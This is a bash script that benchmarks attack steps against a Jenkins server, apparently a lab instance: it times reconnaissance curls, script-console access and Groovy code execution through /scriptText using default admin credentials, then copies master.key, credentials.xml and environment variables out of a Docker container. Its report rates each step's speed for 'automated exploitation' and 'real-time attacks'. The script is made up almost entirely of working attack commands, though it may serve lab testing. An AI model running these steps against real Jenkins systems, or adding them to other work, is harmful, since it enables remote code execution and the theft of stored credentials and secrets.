#!/bin/bash

echo "=========================================="
echo "  JENKINS EXPLOITATION BENCHMARKING"
echo "=========================================="
echo ""

TARGET="${1:-http://localhost:8080}"
ITERATIONS="${2:-10}"
OUTPUT_DIR="/tmp/jenkins-benchmark-$$"

# Configuration - can be overridden with environment variables
JENKINS_USER="${JENKINS_USER:-admin}"
JENKINS_PASS="${JENKINS_PASS:-admin}"

mkdir -p "$OUTPUT_DIR"

echo "[+] Target: $TARGET"
echo "[+] Iterations: $ITERATIONS"
echo "[+] Output: $OUTPUT_DIR"
echo ""

declare -A TIMINGS
TOTAL_TIME=0

benchmark_test() {
    local test_name="$1"
    local command="$2"
    local iterations="$3"
    
    echo "[$test_name]"
    
    local total=0
    local min=999999
    local max=0
    
    for ((i=1; i<=$iterations; i++)); do
        local start=$(date +%s%3N)
        eval "$command" > /dev/null 2>&1
        local end=$(date +%s%3N)
        local duration=$((end - start))
        
        total=$((total + duration))
        [[ $duration -lt $min ]] && min=$duration
        [[ $duration -gt $max ]] && max=$duration
        
        echo -ne "    Iteration $i/$iterations: ${duration}ms\r"
    done
    
    local avg=$((total / iterations))
    echo -ne "\n"
    echo "    Average: ${avg}ms | Min: ${min}ms | Max: ${max}ms"
    
    TIMINGS["$test_name"]=$avg
    TOTAL_TIME=$((TOTAL_TIME + avg))
    
    echo "$test_name,$avg,$min,$max" >> "$OUTPUT_DIR/timings.csv"
}

echo "=========================================="
echo "[PHASE 1] Reconnaissance Benchmarks"
echo "=========================================="
echo ""

benchmark_test "Version Fingerprinting" \
    "curl -s -I $TARGET" \
    $ITERATIONS

benchmark_test "Plugin Enumeration" \
    "curl -s $TARGET/pluginManager/api/json" \
    $ITERATIONS

benchmark_test "Job List Retrieval" \
    "curl -s -u $JENKINS_USER:$JENKINS_PASS $TARGET/api/json?tree=jobs[name]" \
    $ITERATIONS

echo ""
echo "=========================================="
echo "[PHASE 2] Exploitation Benchmarks"
echo "=========================================="
echo ""

benchmark_test "CLI Jar Download" \
    "curl -s -o /tmp/jenkins-cli-test.jar $TARGET/jnlpJars/jenkins-cli.jar" \
    5

benchmark_test "Script Console Access" \
    "curl -s -u $JENKINS_USER:$JENKINS_PASS $TARGET/script" \
    $ITERATIONS

benchmark_test "Groovy Code Execution" \
    "curl -s -u $JENKINS_USER:$JENKINS_PASS $TARGET/scriptText -d 'script=println(1+1)'" \
    $ITERATIONS

benchmark_test "Stapler Endpoint Access" \
    "curl -s $TARGET/securityRealm/user/admin/" \
    $ITERATIONS

echo ""
echo "=========================================="
echo "[PHASE 3] Data Exfiltration Benchmarks"
echo "=========================================="
echo ""

if docker ps 2>/dev/null | grep -q jenkins-lab; then
    CONTAINER=$(docker ps --filter "name=jenkins" --format "{{.Names}}" | head -n 1)
    
    benchmark_test "Master Key Extraction" \
        "docker exec $CONTAINER cat /var/jenkins_home/secrets/master.key > /tmp/bench-master.key" \
        $ITERATIONS
    
    benchmark_test "Credentials XML Extraction" \
        "docker exec $CONTAINER cat /var/jenkins_home/credentials.xml > /tmp/bench-creds.xml" \
        $ITERATIONS
    
    benchmark_test "Environment Variable Dump" \
        "docker exec $CONTAINER printenv > /tmp/bench-env.txt" \
        $ITERATIONS
fi

echo ""
echo "=========================================="
echo "[PHASE 4] Performance Analysis"
echo "=========================================="
echo ""

echo "[+] Generating performance report..."

cat > "$OUTPUT_DIR/BENCHMARK_REPORT.txt" << EOF
========================================
  JENKINS EXPLOITATION BENCHMARK
========================================

Target: $TARGET
Iterations per test: $ITERATIONS
Timestamp: $(date)

TIMING RESULTS
==============
EOF

while IFS=',' read -r name avg min max; do
    printf "%-40s %8s ms (min: %6s, max: %6s)\n" "$name" "$avg" "$min" "$max" >> "$OUTPUT_DIR/BENCHMARK_REPORT.txt"
done < "$OUTPUT_DIR/timings.csv"

cat >> "$OUTPUT_DIR/BENCHMARK_REPORT.txt" << EOF

PERFORMANCE RATINGS
===================
EOF

# Analyze and rate performance
while IFS=',' read -r name avg min max; do
    if [[ $avg -lt 100 ]]; then
        rating="⚡ EXCELLENT"
    elif [[ $avg -lt 500 ]]; then
        rating="✓ GOOD"
    elif [[ $avg -lt 1000 ]]; then
        rating="⚠ MODERATE"
    else
        rating="✗ SLOW"
    fi
    printf "%-40s %s\n" "$name" "$rating" >> "$OUTPUT_DIR/BENCHMARK_REPORT.txt"
done < "$OUTPUT_DIR/timings.csv"

cat >> "$OUTPUT_DIR/BENCHMARK_REPORT.txt" << EOF

EXPLOITATION SPEED METRICS
==========================
Fastest Operation: $(sort -t',' -k2 -n "$OUTPUT_DIR/timings.csv" | head -1 | cut -d',' -f1)
Slowest Operation: $(sort -t',' -k2 -n "$OUTPUT_DIR/timings.csv" | tail -1 | cut -d',' -f1)

Total Average Time: ${TOTAL_TIME}ms
Operations Benchmarked: $(wc -l < "$OUTPUT_DIR/timings.csv")

RECOMMENDATIONS
===============
- Operations < 100ms: Excellent for automated exploitation
- Operations < 500ms: Good for real-time attacks
- Operations > 1000ms: Consider optimization or parallel execution

========================================
EOF

echo "✓ Benchmark report generated"
echo ""

cat "$OUTPUT_DIR/BENCHMARK_REPORT.txt"

echo ""
echo "📁 Full results: $OUTPUT_DIR/BENCHMARK_REPORT.txt"
echo "📊 CSV data: $OUTPUT_DIR/timings.csv"
echo ""
